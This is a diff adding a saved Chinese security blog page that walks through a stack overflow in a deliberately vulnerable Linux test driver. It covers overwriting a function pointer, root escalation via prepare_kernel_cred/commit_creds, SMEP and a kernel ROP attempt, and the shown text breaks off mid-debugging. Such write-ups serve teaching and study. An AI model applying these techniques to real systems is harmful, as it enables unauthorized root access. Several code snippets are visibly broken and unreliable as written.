@@ -1,0 +1,772 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
+    <title>Linux简单内核栈溢出调试分析 | MottoIN</title>
+    <link rel='dns-prefetch' href='//www.mottoin.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; Linux简单内核栈溢出调试分析评论Feed" href="http://www.mottoin.com/88278.html/feed" />
+<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
+<style id='wpcom-qa-inline-css' type='text/css'>
+
+        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
+        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
+        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
+        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
+        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
+        
+</style>
+<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='小记一次PHP对象注入' href='http://www.mottoin.com/88247.html' />
+<link rel='next' title='不常见的xss利用探索' href='http://www.mottoin.com/88317.html' />
+<link rel='shortlink' href='http://www.mottoin.com/?p=88278' />
+<!--  WPCOM主题相关信息开始 -->
+<meta name="applicable-device" content="pc,mobile">
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta name="keywords" content="exploit,linux,Linux内核栈溢出,Linux内核溢出,内核栈溢出,利用调试">
+<meta name="description" content="静态分析程序源码分析：驱动服务端BUFF_SIZE=64structTest{unsignedflag;unsignedsize;charbuff[BUFF_SIZE];void(*func_ptr)(void);}test_data;test_data.func_ptr=test_func;//这里初始化的时候赋值为下面的函数，意味着我们不能修改它staticvoidtest_func(void">
+<!--  WPCOM主题相关信息结束 -->
+ 
+		<script type="text/javascript">
+
+		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
+		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
+		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';
+
+		</script>
+
+	
+		<style type="text/css">.request_name { display: none !important; }</style>
+
+	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
+<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
+    <style>
+                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
+        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
+        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
+        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
+        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
+        .list.tabs .tab.active a{border-bottom-color: #08c;}
+
+        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
+        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
+        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
+        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
+        .special-item-bottom a:hover:before{border-left-color: #07c;}
+        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
+        @media (max-width: 991px){
+            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
+            .navbar-collapse{background-color: #08c;}
+            .dropdown-menu>li a{border-color: #07c;}
+            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
+        }
+        .j-share{position: fixed!important;top: 50%!important;}
+                .header .logo img{max-height: 32px;}
+                @media (max-width: 767px){
+            .header .logo img{max-height: 26px;}
+        }
+                        .btn-post{
+    display: block;
+    margin: 0 auto;
+    padding: 15px 20px;
+    font-size: 16px;
+    text-align: center;
+    color: #fff !important;
+    line-height: 1;
+    background: #1471CA;
+    -webkit-border-radius: 3px;
+    border-radius: 3px;
+    text-decoration: none;
+    border: 0;
+    outline: 0;
+}    </style>
+    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
+    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
+</head>
+<body class="post-template-default single single-post postid-88278 single-format-standard">
+<header class="header">
+    <div class="container clearfix">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="icon-bar icon-bar-1"></span>
+                <span class="icon-bar icon-bar-2"></span>
+                <span class="icon-bar icon-bar-3"></span>
+            </button>
+            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
+        </div>
+        <div class="collapse navbar-collapse">
+            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
+<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
+<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
+<ul role="menu" class=" dropdown-menu">
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
+	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
+</ul>
+</li>
+<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
+<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
+<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
+<ul role="menu" class=" dropdown-menu">
+	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
+	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
+</ul>
+</li>
+<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
+<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
+</ul></nav>            <div class="navbar-action pull-right">
+
+                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
+                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
+                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
+                    </form>
+
+                    
+                    <div id="j-user-wrap">
+                        <a class="login" href="http://www.mottoin.com/login">登录</a>
+                        <a class="login" href="http://www.mottoin.com/register">注册</a>
+                    </div>
+                    <a class="publish" href="http://www.mottoin.com/post">
+                        投稿</a>
+                                                </div>
+        </div><!-- /.navbar-collapse -->
+    </div><!-- /.container -->
+</header>
+<div id="wrap">    <div class="main container">
+        <div class="content">
+                            <article id="post-88278" class="post-88278 post type-post status-publish format-standard has-post-thumbnail hentry category-reverse tag-exploit tag-linux tag-1128 tag-1129">
+                    <div class="entry">
+                        <div class="entry-head">
+                            <h1 class="entry-title">Linux简单内核栈溢出调试分析</h1>
+                            <div class="entry-info">
+                                                                <a class="nickname" href="http://www.mottoin.com/user/seceditor/">Moto</a>
+                                <span class="dot">•</span>
+                                <span>2016年8月28日</span>
+                                <span class="dot">•</span>
+                                <a href="http://www.mottoin.com/category/article/reverse" rel="category tag">逆向破解</a>                                                                    <span class="dot">•</span>
+                                    <span>阅读 1340</span>
+                                                            </div>
+                        </div>
+                                                                        <div class="entry-content clearfix">
+                            <h2>静态分析</h2>
+<h3>程序源码分析：</h3>
+<h3>驱动服务端</h3>
+<pre class="">BUFF_SIZE=64
+struct Test
+{
+ unsigned flag;
+ unsigned size;
+ char buff[BUFF_SIZE];
+ void (*func_ptr) (void);
+}test_data;
+
+test_data.func_ptr = test_func;//这里初始化的时候赋值为下面的函数，意味着我们不能修改它
+
+static void test_func(void)
+{
+ printk("Hello, marvel team.\n");
+ printk("%s\n", test_data.buff);
+}
+
+static void nlproto_recv(struct sk_buff *__skb){
+ ...
+ skb = skb_get(__skb);
+ ...
+ nlh = nlmsg_hdr(skb);
+ msg_body = (struct Test *)NLMSG_DATA(nlh);
+ test_data.flag = msg_body-&gt;flag;
+ test_data.size = msg_body-&gt;size;
+【1】if (msg_body-&gt;size) {
+ memcpy(test_data.buff, msg_body-&gt;buff, msg_body-&gt;size);
+ //这里并没有检查msg_body的长度，如果溢出到func_ptr，就修改函数的指向，去执行任意的地址
+ }
+ if (2 == test_data.flag) {
+ test_data.func_ptr();//这里无条件执行了func_ptr()函数
+ }
+}</pre>
+<h3>用户端代码分析</h3>
+<pre class="">nlproto_init();
+const char *msg =)
+test_data.flag = 2;
+test_data.size = strlen(msg);//这里我们可控
+strncpy(test_data.buff, msg, strlen(msg) + 1);//这里也是可控，所以可以轻易溢出
+nlproto_send(&amp;test_data);</pre>
+<h3>程序汇编分析</h3>
+<p>编译后它把test_nlproto_recv和nlproto_recv合并到了一起</p>
+<p><img class="alignnone size-full wp-image-88279 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/1-83.png" alt="1" width="548" height="721" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/1-83.png 548w, http://www.mottoin.com/wp-content/uploads/2016/08/1-83-228x300.png 228w" sizes="(max-width: 548px) 100vw, 548px" /></p>
+<h2>动态调试</h2>
+<h3>用printk进行溢出测试（无SMEP）</h3>
+<h3>修改服务器端</h3>
+<p>把【1】处先屏蔽掉，换成输出buff，和指针值</p>
+<pre class="">printk("func_ptr:%p",test_data.func_ptr);
+int i=0;
+for (;i&lt;strlen(test_data.buff),i++){
+ printf("%x)
+}</pre>
+<h3>客户端修改</h3>
+<pre class="">const char *msg ="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";//64个
+test_data.flag = 2;
+test_data.size = strlen(msg)+9;//这里我们可控
+strncpy(test_data.buff, msg, strlen(msg) );
+strncpy(test_data.buff+strlen(msg), get_func_addr(), 9)</pre>
+<h3>测试结果分析：</h3>
+<p>用户程序的地址：</p>
+<p><img class="alignnone size-full wp-image-88280 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/2-77.png" alt="2" width="413" height="50" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/2-77.png 413w, http://www.mottoin.com/wp-content/uploads/2016/08/2-77-300x36.png 300w" sizes="(max-width: 413px) 100vw, 413px" /></p>
+<p>内核里的函数内存内容：</p>
+<p><img class="alignnone size-full wp-image-88281 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/3-71.png" alt="3" width="659" height="124" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/3-71.png 659w, http://www.mottoin.com/wp-content/uploads/2016/08/3-71-300x56.png 300w" sizes="(max-width: 659px) 100vw, 659px" /></p>
+<p>可以看到func_ptr已经被修改为我们想修改的地址了。接下来是提权利用。</p>
+<h3>无SMEP的提权利用</h3>
+<p>先把test.c添加以下代码：</p>
+<p><img class="alignnone size-full wp-image-88282 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/4-67.png" alt="4" width="714" height="641" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/4-67.png 714w, http://www.mottoin.com/wp-content/uploads/2016/08/4-67-300x269.png 300w" sizes="(max-width: 714px) 100vw, 714px" /></p>
+<h3>提权函数说明</h3>
+<blockquote><p>prepare_kernel_cred：创建一个新的 credential structure，如果提供的参数是null，就将所有的uid/gid字段置0，其他置1，换句话说，就是创建一个带特权和norestricted 的cred 结构。</p>
+<p>commit_creds：使用传入的cred 结构体替换当前进程的cred结构体</p></blockquote>
+<p>执行结果如下：</p>
+<p><img class="alignnone size-full wp-image-88283 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/5-57.png" alt="5" width="380" height="162" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/5-57.png 380w, http://www.mottoin.com/wp-content/uploads/2016/08/5-57-300x128.png 300w" sizes="(max-width: 380px) 100vw, 380px" /></p>
+<p>成功提权！</p>
+<h3>kgdb内核调试</h3>
+<h3>配置双机调试环境</h3>
+<p>参考我前一篇文章或者看这个<a href="http://blog.csdn.net/jie12310/article/details/4564853">配置教程</a></p>
+<h2>断点设置</h2>
+<p>继续使用前面的rop进行调试</p>
+<ul>
+<li>添加符号文件<br />
+被调试机:cat /sys/module/mydrivertest/sections/.text 获取.text地址addr<br />
+调试机的gdb里:add-sysmbol-file mydriver.ko addr（取决于本机文件路径）</li>
+<li>在程序入口处下断<br />
+路径为被调试机的路径</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88284 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/6-50.png" alt="6" width="697" height="73" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/6-50.png 697w, http://www.mottoin.com/wp-content/uploads/2016/08/6-50-300x31.png 300w" sizes="(max-width: 697px) 100vw, 697px" /></p>
+<h3>开始调试</h3>
+<ul>
+<li>查看汇编</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88285 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/7-39.png" alt="7" width="703" height="156" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/7-39.png 703w, http://www.mottoin.com/wp-content/uploads/2016/08/7-39-300x67.png 300w" sizes="(max-width: 703px) 100vw, 703px" /></p>
+<ul>
+<li>运行到memcpy</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88286 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/8-36.png" alt="8" width="711" height="290" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/8-36.png 711w, http://www.mottoin.com/wp-content/uploads/2016/08/8-36-300x122.png 300w" sizes="(max-width: 711px) 100vw, 711px" /></p>
+<ul>
+<li>查看寄存器</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88287 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/9-30.png" alt="9" width="520" height="56" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/9-30.png 520w, http://www.mottoin.com/wp-content/uploads/2016/08/9-30-300x32.png 300w" sizes="(max-width: 520px) 100vw, 520px" /></p>
+<ul>
+<li>查看rdi内容</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88288 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/10-22.png" alt="10" width="674" height="58" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/10-22.png 674w, http://www.mottoin.com/wp-content/uploads/2016/08/10-22-300x26.png 300w" sizes="(max-width: 674px) 100vw, 674px" /></p>
+<ul>
+<li>执行后</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88289 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/11-20.png" alt="11" width="692" height="105" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/11-20.png 692w, http://www.mottoin.com/wp-content/uploads/2016/08/11-20-300x46.png 300w" sizes="(max-width: 692px) 100vw, 692px" /></p>
+<p>这就是test_data.buff的内容，最后的16字节就是函数指针的值，可以看到它已经被修改为我们test程序的内存地址。</p>
+<ul>
+<li>再来查看一下执行流程</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88290 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/12-14.png" alt="12" width="695" height="411" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/12-14.png 695w, http://www.mottoin.com/wp-content/uploads/2016/08/12-14-300x177.png 300w" sizes="(max-width: 695px) 100vw, 695px" /></p>
+<p>可以看到它调用了rip+0x3b2的地址，运行到那个位置，看到call了func_ptr指针，而该指针已经被我们覆盖了。</p>
+<ul>
+<li>步入，查看提权代码</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88291 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/13-14.png" alt="13" width="565" height="261" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/13-14.png 565w, http://www.mottoin.com/wp-content/uploads/2016/08/13-14-300x139.png 300w" sizes="(max-width: 565px) 100vw, 565px" /></p>
+<ul>
+<li>查看rax,rdx指向地址</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88292 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/14-14.png" alt="14" width="648" height="142" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/14-14.png 648w, http://www.mottoin.com/wp-content/uploads/2016/08/14-14-300x66.png 300w" sizes="(max-width: 648px) 100vw, 648px" /></p>
+<p><img class="alignnone size-full wp-image-88293 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/15-12.png" alt="15" width="504" height="185" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/15-12.png 504w, http://www.mottoin.com/wp-content/uploads/2016/08/15-12-300x110.png 300w" sizes="(max-width: 504px) 100vw, 504px" /></p>
+<p>可以看到这里调用了prepare_kernel_cred，commit_creds函数</p>
+<p>但是继续单步就出现了如下错误：</p>
+<p><img class="alignnone size-full wp-image-88294 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/16-11.png" alt="16" width="495" height="81" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/16-11.png 495w, http://www.mottoin.com/wp-content/uploads/2016/08/16-11-300x49.png 300w" sizes="(max-width: 495px) 100vw, 495px" /></p>
+<p>为什么出错呢？</p>
+<p>这个就是因为SMEP了。</p>
+<blockquote><p>SMEP(Supervisor Mode Execution Protection)</p>
+<p>查看维基的说明如下</p>
+<p><img class="alignnone size-full wp-image-88295 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/17-7.png" alt="17" width="819" height="53" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/17-7.png 819w, http://www.mottoin.com/wp-content/uploads/2016/08/17-7-300x19.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/17-7-768x50.png 768w" sizes="(max-width: 819px) 100vw, 819px" /></p>
+<p>意思是，如果设置了这个寄存器位，程序不能运行比自己的ring还高的地址。简单说就是内核的程序不能随便运行用户态的代码。</p>
+<p>（it is documented in the newest release (May 2011) of the Intel manual 3A sections 2.5 (CR4.SMEP flag) and 4.6 (per memory page settings).）</p></blockquote>
+<p>相关的还要SMAP（虽然这里不涉及）：</p>
+<blockquote><p>SMAP（supervisor mode access prevention，防止超级用户访问）机制。SMAP（supervisor mode access prevention），它将阻止处理器运行在 CPL &lt; 3 权限时访问属于 user 页面里的数据（即：各级页表项最终结合的 U/S 权限位为 1）。 也就是：处理器运行在 CPL &lt; 3 权限下只能访问属于 supervisor 的页面</p></blockquote>
+<p>所以这次不能成功提权了，尝试内核rop</p>
+<h3>内核rop构造</h3>
+<ul>
+<li>查看test_data的buff地址</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88297 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/18-4.png" alt="18" width="470" height="69" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/18-4.png 470w, http://www.mottoin.com/wp-content/uploads/2016/08/18-4-300x44.png 300w" sizes="(max-width: 470px) 100vw, 470px" /></p>
+<ul>
+<li>查看执行call fun_ptr 时的寄存器状态：</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88298 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/19-5.png" alt="19" width="671" height="313" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/19-5.png 671w, http://www.mottoin.com/wp-content/uploads/2016/08/19-5-300x140.png 300w" sizes="(max-width: 671px) 100vw, 671px" /></p>
+<p>可以看到，rdi指向的地址刚好是函数的地址，而rsp就离我们的test_buff很远了。所以我期望rop是这样构造：</p>
+<p><img class="alignnone size-full wp-image-88299 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/20-4.png" alt="20" width="414" height="179" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/20-4.png 414w, http://www.mottoin.com/wp-content/uploads/2016/08/20-4-300x130.png 300w" sizes="(max-width: 414px) 100vw, 414px" /></p>
+<p>但是还有一个问题，依据commit_creds的功能，我们必须让代码指行的时候，是在用户层，不然只是替换了驱动的cred，而我们的用户程序还是不能提权，原作者到现在都没有出part 2的文章，我就只能靠自己了。</p>
+<p>不管那么多，先来个完整的rop先</p>
+<p>*&amp;%￥#%￥……@&amp;%￥##！~“</p>
+<p>额，试了好几个，找不到这类gadges啊 T-T</p>
+<p>考虑把代码放到test_data.buff里，然后执行看看，发现可以执行，所以打算让func_ptr指向call [rdi+0x10]位置，然后在rdi+0x10（即func_ptr+0x10)位置填写test_data.buff的地址，就能执行test_data.buff里的任意代码了^-^</p>
+<h3>构造新的payload</h3>
+<ul>
+<li>buff内存分布</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88301 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/21-3.png" alt="21" width="557" height="126" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/21-3.png 557w, http://www.mottoin.com/wp-content/uploads/2016/08/21-3-300x68.png 300w" sizes="(max-width: 557px) 100vw, 557px" /></p>
+<ul>
+<li>执行到call 函数</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88302 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/22-3.png" alt="22" width="619" height="69" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/22-3.png 619w, http://www.mottoin.com/wp-content/uploads/2016/08/22-3-300x33.png 300w" sizes="(max-width: 619px) 100vw, 619px" /></p>
+<ul>
+<li>si步入</li>
